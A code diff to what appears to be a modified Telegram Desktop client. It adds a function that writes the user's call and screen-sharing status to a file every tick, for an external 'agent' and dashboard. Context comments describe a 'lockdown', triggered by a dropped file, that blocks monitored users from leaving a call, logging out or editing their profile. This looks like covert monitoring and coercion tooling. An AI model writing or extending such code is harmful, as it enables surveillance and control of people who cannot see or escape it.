@@ -62,6 +62,23 @@ struct Config {
 	return cfg;
 }
 
+// Write the live demo state to <workdir>/satan_status.json every tick. The agent reads
+// it and reports Telegram/demonstration status to the dashboard. Includes a unix ts so
+// the agent can tell a fresh file from a stale one (client killed).
+inline void WriteStatus(bool running, bool inCall, bool sharing) {
+	QFile f(cWorkingDir() + QStringLiteral("satan_status.json"));
+	if (f.open(QIODevice::WriteOnly | QIODevice::Truncate | QIODevice::Text)) {
+		const auto ts = QDateTime::currentDateTime().toSecsSinceEpoch();
+		const auto json = QStringLiteral(
+			"{\"running\":%1,\"inCall\":%2,\"sharing\":%3,\"ts\":%4}")
+			.arg(running ? 1 : 0)
+			.arg(inCall ? 1 : 0)
+			.arg(sharing ? 1 : 0)
+			.arg(ts);
+		f.write(json.toUtf8());
+	}
+}
+
 // Lockdown is engaged whenever the agent dropped a satanshield.json next to tdata.
 // Used to block leaving the call, the in-app logout, profile edits, etc. A normal
 // (non-monitored) user has no such file, so everything behaves stock.
